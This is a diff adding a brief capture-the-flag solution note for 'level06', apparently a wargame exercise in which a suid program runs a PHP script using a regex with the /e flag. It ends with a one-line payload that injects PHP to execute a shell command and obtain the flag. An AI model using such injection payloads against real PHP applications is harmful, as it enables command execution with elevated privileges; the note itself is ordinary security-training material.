@@ -1,0 +1,6 @@
+# level06 executes level06.php with suid
+
+the first regex uses the /e flag which evaluates PHP code and is a security vulnerability
+we exploit the regex with the right format string
+
+[x {${shell_exec(getflag)}}]
